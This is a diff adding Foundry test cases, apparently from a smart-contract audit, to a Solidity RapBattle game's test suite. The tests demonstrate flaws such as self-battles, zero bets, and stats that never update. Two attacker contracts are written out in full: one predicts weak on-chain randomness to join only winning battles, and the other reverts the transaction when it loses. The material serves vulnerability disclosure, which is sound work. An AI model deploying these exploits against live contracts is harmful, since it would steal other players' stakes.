@@ -7,6 +7,8 @@ import {OneShot} from "../src/OneShot.sol";
 import {Streets} from "../src/Streets.sol";
 import {Credibility} from "../src/CredToken.sol";
 import {IOneShot} from "../src/interfaces/IOneShot.sol";
+import {ICredToken} from "../src/interfaces/ICredToken.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract RapBattleTest is Test {
     RapBattle rapBattle;
@@ -17,6 +19,9 @@ contract RapBattleTest is Test {
     address user;
     address challenger;
 
+    address maliciousactor;
+    address attacker;
+
     function setUp() public {
         oneShot = new OneShot();
         cred = new Credibility();
@@ -24,6 +29,9 @@ contract RapBattleTest is Test {
         rapBattle = new RapBattle(address(oneShot), address(cred));
         user = makeAddr("Alice");
         challenger = makeAddr("Slim Shady");
+
+        maliciousactor = makeAddr("maliciousactor");
+        attacker = makeAddr("attacker");
 
         oneShot.setStreetsContract(address(streets));
         cred.setStreetsContract(address(streets));
@@ -259,4 +267,301 @@ contract RapBattleTest is Test {
                 == bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))
         );
     }
+
+
+    // `defender` and `challenger` can be same address in battle.
+    function testStartBattleAsDefenderAndChallengerAreSameAddress() public {
+        vm.startPrank(user);
+
+        oneShot.mintRapper();
+        oneShot.mintRapper();
+
+        oneShot.approve(address(streets), 0);
+        oneShot.approve(address(streets), 1);
+
+        streets.stake(0);
+        streets.stake(1);
+
+        vm.warp(block.timestamp + 4 days);
+
+        streets.unstake(0);
+        streets.unstake(1);
+
+        assertEq(cred.balanceOf(user), 8);
+
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 8);
+
+
+        rapBattle.goOnStageOrBattle(0, 4);
+        rapBattle.goOnStageOrBattle(1, 4);
+
+        vm.stopPrank();
+    }
+
+    // challenger can start a battle without even having an `Rapper NFT` and `CredToken`. by passing Other Peoples Rapper NFT tokenId that has better stats and just entering the same number as `defenderBet`, if he won, then he will the prize otherwise the transaction will reveret. 
+    function testChallengerStartsBattleWithoutHavingAnCredTokenOrRapperNFT() public {
+        vm.startPrank(user);
+        oneShot.mintRapper();
+
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+
+        vm.warp(block.timestamp + 4 days);
+        streets.unstake(0);
+        assertEq(cred.balanceOf(user), 4);
+
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 4);
+        rapBattle.goOnStageOrBattle(0, 4);
+
+        vm.stopPrank();
+
+        vm.startPrank(challenger);
+        // challenger joins the battle without having `CredToken` or `RapperNFT`. now challenger either gonna win the battle and get `Cred` tokens as Reward, or this
+        // will revert because of `credToken.transferFrom(msg.sender, _defender, _credBet);`, since challenger has no `Cred` token to transfer from himself to `defender`.
+        rapBattle.goOnStageOrBattle(0, 4);
+        vm.stopPrank();
+    }
+
+    // `_credBet` amount can be `0`, if an battle start's, it does not matter who won the battle, winner will receive nothing.
+    function testGoOnStageWith_credBetAmounttoZero() public {
+        vm.startPrank(user);
+        oneShot.mintRapper();
+
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+
+        vm.warp(block.timestamp + 4 days);
+        streets.unstake(0);
+        assertEq(cred.balanceOf(user), 4);
+
+        oneShot.approve(address(rapBattle), 0);
+        // cred.approve(address(rapBattle), 0);
+
+        // `user` goes on stage as `defender` and set's `_credBet` to 0, which this can result in totalPrize to be `0`.
+        rapBattle.goOnStageOrBattle(0, 0);
+        vm.stopPrank();
+
+        assertEq(rapBattle.defenderBet(), 0);
+    }
+
+    // we don't increment the winner of the battle RapperStats `battlesWon` number.
+    function testBattlesWonOftheWinnerIsNotBeingIncremented() public {
+        // user mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `defender`.
+        vm.startPrank(user);
+
+        oneShot.mintRapper();
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+
+        vm.warp(block.timestamp + 4 days);
+        streets.unstake(0);
+        assertEq(cred.balanceOf(user), 4);
+
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 4);
+        rapBattle.goOnStageOrBattle(0, 4);
+
+        vm.stopPrank();
+
+        // challenger mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `challenger`.
+        vm.startPrank(challenger);
+        oneShot.mintRapper();
+        oneShot.approve(address(streets), 1);
+        streets.stake(1);
+
+        vm.warp(block.timestamp + 4 days);
+        streets.unstake(1);
+        assertEq(cred.balanceOf(challenger), 4);
+
+        oneShot.approve(address(rapBattle), 1);
+        cred.approve(address(rapBattle), 4);
+        rapBattle.goOnStageOrBattle(1, 4);
+
+        vm.stopPrank();
+
+
+        // the winner of the rap battle either was `defender` or `challenger`. this means that `battlesWon` number of the Winner Rapper NFT should've been incremented by 1.
+        // defender tokenId is `0`
+        // challenger tokenId is `1`
+        // let's check it.
+        IOneShot.RapperStats memory rapperStatsOfDefender =  oneShot.getRapperStats(0);
+        IOneShot.RapperStats memory rapperStatsOfChallenger = oneShot.getRapperStats(1);
+
+        vm.expectRevert(); // if the line below reverts, that means the `battlesWon` of the winner NFT, does not get incremented.
+        assert(rapperStatsOfDefender.battlesWon == 1 || rapperStatsOfChallenger.battlesWon == 1);
+    }
+
+    // attacker can use weak Randomness to findout if his gonna win the battle or not.
+    function testAttackerCanGuessWhoWins() public {
+        // user mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `defender`.
+        vm.startPrank(user);
+
+        oneShot.mintRapper();
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+
+        vm.warp(block.timestamp + 4 days);
+        streets.unstake(0);
+        assertEq(cred.balanceOf(user), 4);
+
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 4);
+        rapBattle.goOnStageOrBattle(0, 4);
+
+        vm.stopPrank();
+
+        // attacker mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `challenger`.
+        AttackerJoinsBattle attackerContract = new AttackerJoinsBattle(oneShot, cred, rapBattle, streets);
+        uint256 tokenId = oneShot.getNextTokenId();
+        attackerContract.getRapperNftAndStakeIt(tokenId, 4 days);
+
+        // take a look at `joinBattleToWin()` function in Attacker Contract, Which showcases how someone can guess random number if you use
+        // global variables like block.timestamp and block.prevrandao.
+        vm.expectEmit();
+        emit RapBattle.Battle(address(attackerContract), tokenId, address(attackerContract));
+        attackerContract.joinBattleToWin(tokenId);
+
+        // attacker successfully won the battle and now has 8 cred Tokens.
+        assertEq(cred.balanceOf(address(attackerContract)), 8);
+    }
+
+
+    // if the challenger is an smartContract, he can start a battle, and after he find out he lost the battle, reverts the whole transaction, if he won it, then he will just take the prize.
+    function testAttackerJoinsTheBattleAsSmartContractRevertsifheLosesBattleOtherwiseTakesThePrizeIfWon() public {
+        // user mints himself an Rapper NFT and stakes it for 4 days to get 4 Cred tokens in return, to become the `defender`.
+        vm.startPrank(user);
+
+        oneShot.mintRapper();
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+
+        vm.warp(block.timestamp + 4 days);
+        streets.unstake(0);
+        assertEq(cred.balanceOf(user), 4);
+
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 4);
+        rapBattle.goOnStageOrBattle(0, 4);
+
+        vm.stopPrank();
+
+
+        AttackerRevertsIfHeLoses attackerContract = new AttackerRevertsIfHeLoses(oneShot, cred, rapBattle, streets);
+        uint256 tokenId = oneShot.getNextTokenId();
+        attackerContract.getRapperNftAndStakeIt(tokenId, 4 days);
+        // next line will revert if we lose the battle. otherwise we are the winner and gonna receive the `defenderBet` as Prize.
+        attackerContract.revertIfLostBetOtherwiseTakeThePrize(tokenId);
+    }
+
+
+
+
 }
+
+
+
+contract AttackerRevertsIfHeLoses is Test, IERC721Receiver {
+
+        IOneShot immutable oneShot;
+        Credibility immutable credToken;
+        RapBattle immutable rapBattle;
+        Streets immutable streets;
+
+        constructor(IOneShot _oneShot, Credibility _credToken, RapBattle _rapBattle, Streets _streets) {
+            oneShot = IOneShot(_oneShot);
+            credToken = _credToken;
+            rapBattle = RapBattle(_rapBattle);
+            streets = _streets;
+        }
+
+        function revertIfLostBetOtherwiseTakeThePrize(uint256 _tokenId) external {
+            require(rapBattle.defender() != address(0), "There's No Defender Yet Waiting for an Challenger.");
+            uint256 credTokenBalance = credToken.balanceOf(address(this));
+            require(credTokenBalance >= rapBattle.defenderBet(), "Not Enough Balance to Join the Battle as Challenger.");
+
+            oneShot.approve(address(rapBattle), _tokenId);
+            credToken.approve(address(rapBattle), rapBattle.defenderBet());
+            rapBattle.goOnStageOrBattle(_tokenId, rapBattle.defenderBet());
+
+            require(credToken.balanceOf(address(this)) > credTokenBalance, "Let's Revert Because We Lose the Bet.");
+        }
+        
+
+        function getRapperNftAndStakeIt(uint256 _tokenId, uint256 _days) external {
+            oneShot.mintRapper();
+            oneShot.approve(address(streets), _tokenId);
+            streets.stake(_tokenId);
+
+            vm.warp(block.timestamp + _days);
+            streets.unstake(_tokenId);
+        }
+
+
+        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
+            return IERC721Receiver.onERC721Received.selector;
+        }
+
+}
+
+
+
+
+
+
+
+contract AttackerJoinsBattle is Test, IERC721Receiver {
+
+    IOneShot immutable oneShot;
+    Credibility immutable credToken;
+    RapBattle immutable rapBattle;
+    Streets immutable streets;
+
+    constructor(IOneShot _oneShot, Credibility _credToken, RapBattle _rapBattle, Streets _streets) {
+        oneShot = IOneShot(_oneShot);
+        credToken = _credToken;
+        rapBattle = RapBattle(_rapBattle);
+        streets = _streets;
+    }
+
+    function joinBattleToWin(uint256 _tokenId) external {
+        require(rapBattle.defender() != address(0), "There's No Defender Yet Waiting for an Challenger.");
+        require(credToken.balanceOf(address(this)) >= rapBattle.defenderBet(), "Not Enough Balance to Join the Battle as Challenger.");
+
+        uint256 defenderRapperSkill = rapBattle.getRapperSkill(rapBattle.defenderTokenId());
+        uint256 challengerRapperSkill = rapBattle.getRapperSkill(_tokenId);
+        uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;
+
+        uint256 i;
+        while (true) {
+            vm.warp(block.timestamp + i);
+            uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % totalBattleSkill;
+            if (random > defenderRapperSkill) {
+                oneShot.approve(address(rapBattle), _tokenId);
+                credToken.approve(address(rapBattle), rapBattle.defenderBet());
+                rapBattle.goOnStageOrBattle(_tokenId, rapBattle.defenderBet());
+                break;
+            }    
+            i++;
+        }
+
+    }
+
+    function getRapperNftAndStakeIt(uint256 _tokenId, uint256 _days) external {
+        oneShot.mintRapper();
+        oneShot.approve(address(streets), _tokenId);
+        streets.stake(_tokenId);
+
+        vm.warp(block.timestamp + _days);
+        streets.unstake(_tokenId);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+}
+
+
+
